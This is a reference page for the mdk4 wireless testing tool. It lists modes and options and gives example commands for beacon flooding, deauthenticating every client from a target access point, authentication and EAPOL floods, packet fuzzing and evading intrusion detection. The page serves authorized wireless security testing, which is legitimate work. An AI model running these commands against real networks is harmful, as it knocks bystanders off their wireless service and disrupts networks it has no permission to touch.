# MDK4

- **Category**: Wireless / 802.11 Testing
- **Risk Level**: 🔴 Critical

---

## Description

mdk4 is an 802.11 protocol testing tool and successor to mdk3. It tests wireless infrastructure resilience through beacon flooding, authentication/deauthentication DoS, SSID probing, EAPOL start flooding, packet fuzzing, and WIDS/WIPS evasion. Used to assess wireless network defenses and identify weaknesses in access point configurations.

## Installation

```bash
sudo apt install mdk4
```

## Parameter Reference

| Parameter | Description |
|-----------|-------------|
| `<interface>` | Monitor mode wireless interface |
| `b` | Beacon flood mode |
| `a` | Authentication DoS mode |
| `d` | Deauthentication / disassociation mode |
| `p` | SSID probing and brute force |
| `m` | Michael countermeasure exploitation (TKIP) |
| `e` | EAPOL start / logoff flood |
| `s` | IEEE 802.11s mesh network attacks |
| `w` | WIDS/WIPS confusion |
| `f` | Packet fuzzer |
| `x` | WiFi protocol implementation vulnerability testing |

### Common mode options

| Parameter | Description |
|-----------|-------------|
| `-c <channel>` | Channel to operate on |
| `-t <bssid>` | Target AP BSSID |
| `-s <pps>` | Packets per second |
| `-n <name>` | SSID name (beacon flood) |
| `-f <file>` | SSID list file (beacon flood) |
| `--ghost <period>,<max_rate>,<min_txpower>` | IDS evasion via ghosting |
| `--frag <min>,<max>,<percent>` | IDS evasion via packet fragmentation |

## Common Commands

### Scenario 1: Beacon flooding

```bash
# Flood area with fake APs
sudo mdk4 wlan0mon b

# Beacon flood on specific channel with custom names
sudo mdk4 wlan0mon b -c 6 -n "FakeNetwork"

# Beacon flood from SSID list
sudo mdk4 wlan0mon b -f /tmp/ssid_list.txt -c 6
```

### Scenario 2: Targeted Deauth

```bash
# Deauthenticate all clients from target AP
sudo mdk4 wlan0mon d -c 6 -t AA:BB:CC:DD:EE:FF

# Deauth with controlled speed
sudo mdk4 wlan0mon d -c 6 -t AA:BB:CC:DD:EE:FF -s 50
```

### Scenario 3: Authentication DoS

```bash
# Flood target AP with authentication requests
sudo mdk4 wlan0mon a -t AA:BB:CC:DD:EE:FF -m

# Test AP client capacity
sudo mdk4 wlan0mon a -t AA:BB:CC:DD:EE:FF -c 6
```

### Scenario 4: EAPOL start flood

```bash
# Flood target with EAPOL-Start frames
sudo mdk4 wlan0mon e -t AA:BB:CC:DD:EE:FF
```

### Scenario 5: Packet fuzzing

```bash
# Fuzz packets against target AP
sudo mdk4 wlan0mon f -t AA:BB:CC:DD:EE:FF -c 6
```

## Notes & Tips

1. Requires monitor mode and packet injection — enable with `airmon-ng start wlan0`
2. Deauth and authentication DoS are highly disruptive — use only in authorized isolated environments
3. Beacon flooding can overwhelm nearby clients; limit scope with `-c` channel restriction
4. Testing 802.11w (Protected Management Frames): if Deauth has no effect, PMF is working correctly
5. Successor to mdk3 with improved attack implementations and additional modes

---

## Official References

- [mdk4 (GitHub)](https://github.com/aircrack-ng/mdk4)
- [mdk4 — Kali Tools](https://www.kali.org/tools/mdk4/)
